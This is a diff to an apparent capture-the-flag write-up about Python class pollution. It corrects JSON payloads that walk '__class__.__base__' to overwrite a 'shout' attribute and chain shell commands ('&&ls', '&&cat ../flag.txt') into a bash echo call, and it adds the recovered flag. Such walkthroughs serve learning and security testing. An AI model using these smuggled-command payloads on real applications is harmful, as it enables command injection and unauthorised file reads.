@@ -40,6 +40,8 @@ next, we take a look on how the king shouts our message. it uses:
 So, it just runs the bash command 'echo our_message'. We can easily inject some code there, for example by using:
 `{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&ls"}}}}}`
 to get the files in the current directory. using:
-`{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&ls ..\"}}}}}`
+`{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&ls ../"}}}}}`
 we see where the flag is, and print it using:
-`{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&cat ..\flag.txt"}}}}}`
+`{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&cat ../flag.txt"}}}}}`
+
+It outputs the flag: DBH{p0llu710n_15_n0t_jU57_4_j4v45cr1p7_th1nG}
